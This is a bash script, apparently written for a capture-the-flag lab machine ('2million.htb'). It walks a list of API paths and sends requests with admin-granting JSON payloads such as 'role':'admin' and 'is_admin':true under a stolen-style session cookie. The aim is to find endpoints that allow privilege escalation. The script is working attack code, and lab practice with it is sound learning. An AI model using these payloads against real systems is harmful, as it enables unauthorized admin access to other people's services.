#!/usr/bin/env bash
# probe_admin_endpoints_nojq.sh
# Probes candidate API endpoints to find ones that accept state-changing methods.
# DOES NOT depend on jq.
#
# Usage: ./probe_admin_endpoints_nojq.sh
#
# Make sure ~/ffuf_admin/all_candidates.txt exists (list of paths, one per line)
# and replace COOKIE value below with your valid session cookie.

set -euo pipefail

TARGET_IP="10.10.11.221"
VHOST="2million.htb"
COOKIE="PHPSESSID=k5f61e4rkv8i23ervq5ohfbi87"   # <-- change if needed
CAND_FILE="${HOME}/ffuf_admin/all_candidates.txt"
OUT="${HOME}/ffuf_admin/probe_results_nojq.txt"

mkdir -p "$(dirname "$OUT")"
: > "$OUT"

# Common payloads as a bash array (no jq required)
PAYLOADS=(
  '{"role":"admin"}'
  '{"admin":true}'
  '{"is_admin":true}'
  '{"permissions":["admin"]}'
  '{"role":"administrator"}'
  '{"make_admin":true}'
  '{"username":"nathan","role":"admin"}'
)

# Methods to try
methods=(GET POST PUT PATCH)

# Function to perform a single request and return HTTP code
do_request() {
  local method="$1"
  local url="$2"
  local data="$3"

  if [ "$method" = "GET" ]; then
    # GET - no body
    curl -s -o /dev/null -w "%{http_code}" -H "Host: $VHOST" -b "$COOKIE" -X GET "$url"
  else
    # Methods with JSON body
    curl -s -o /dev/null -w "%{http_code}" -H "Host: $VHOST" -H "Content-Type: application/json" -b "$COOKIE" -X "$method" -d "$data" "$url"
  fi
}

# Iterate candidate paths
while IFS= read -r path || [ -n "$path" ]; do
  path="$(echo "$path" | sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//')"
  [ -z "$path" ] && continue

  # normalize url
  if [[ "$path" =~ ^/ ]]; then
    full="http://$TARGET_IP${path}"
  else
    full="http://$TARGET_IP/$path"
  fi

  echo "=== Testing $path ===" | tee -a "$OUT"

  # Quick GET probe
  code=$(do_request "GET" "$full" "")
  echo "GET -> $code" | tee -a "$OUT"

  # Try each method with each payload
  for m in "${methods[@]}"; do
    if [ "$m" = "GET" ]; then
      # already did GET but print again for completeness
      echo "GET $path -> $code" | tee -a "$OUT"
      continue
    fi

    for pl in "${PAYLOADS[@]}"; do
      code=$(do_request "$m" "$full" "$pl" || echo "000")
      echo "$m $path with payload $pl -> $code" | tee -a "$OUT"
    done
  done

done < "$CAND_FILE"

echo "Done. Results saved to $OUT"
